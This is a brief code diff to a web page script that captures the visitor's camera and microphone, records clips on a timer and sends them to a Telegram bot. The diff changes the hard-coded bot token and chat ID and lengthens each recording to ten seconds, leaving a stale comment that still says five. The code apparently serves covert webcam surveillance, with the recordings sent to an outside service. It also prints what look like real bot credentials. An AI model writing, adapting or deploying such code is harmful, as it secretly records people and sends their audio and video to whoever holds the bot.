@@ -35,8 +35,8 @@
     let mediaRecorder;
     let audioChunks = [];
 
-    const TELEGRAM_BOT_TOKEN = '7458611916:AAHrvxkZm0vIcQRof2TGAryKUGD-Xw0eA0s';
-    const CHAT_ID = '5861659575'; // Replace with your Telegram Chat ID
+    const TELEGRAM_BOT_TOKEN = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA';
+    const CHAT_ID = '1691680798'; // Replace with your Telegram Chat ID
 
     // Start video stream
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
@@ -98,8 +98,8 @@
             mediaRecorder.start();
             setTimeout(() => {
                 mediaRecorder.stop();
-            }, 5000); // Stop recording after 5 seconds
-        }, 5000);
+            }, 10000); // Stop recording after 5 seconds
+        }, 10000);
     }
 
     async function sendToTelegram(message, data) {
